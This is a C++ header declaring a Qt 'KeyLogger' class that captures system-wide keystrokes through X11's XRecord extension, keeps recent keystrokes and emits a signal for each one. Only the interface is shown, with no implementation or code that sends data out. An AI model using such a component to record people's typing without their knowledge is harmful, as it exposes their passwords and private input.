#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <QObject>
#include <QTimer>
#include <QDateTime>
#include <QThread>
#include <QMutex>
#include <QStringList>
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/extensions/record.h>
#include <memory>

class KeyLogger : public QObject
{
    Q_OBJECT

public:
    explicit KeyLogger(QObject *parent = nullptr);
    ~KeyLogger();

    void startLogging();
    void stopLogging();
    bool isLogging() const { return m_logging; }
    
    QStringList getRecentKeystrokes(int count = 100) const;

signals:
    void keystrokeDetected(const QString& keystroke);
    void specialKeyPressed(const QString& keyName);

private slots:
    void captureKeystrokes();

private:
    void setupX11();
    void cleanupX11();
    QString keysymToString(KeySym keysym);
    void logKeystroke(const QString& key);
    
    static void recordCallback(XPointer closure, XRecordInterceptData* data);
    
    Display* m_display;
    Display* m_recordDisplay;
    XRecordContext m_recordContext;
    XRecordRange* m_recordRange;
    
    QTimer* m_captureTimer;
    QMutex m_keystrokeMutex;
    QStringList m_recentKeystrokes;
    
    bool m_logging;
    bool m_x11Initialized;
    
    static const int MAX_KEYSTROKES;
};

#endif // KEYLOGGER_H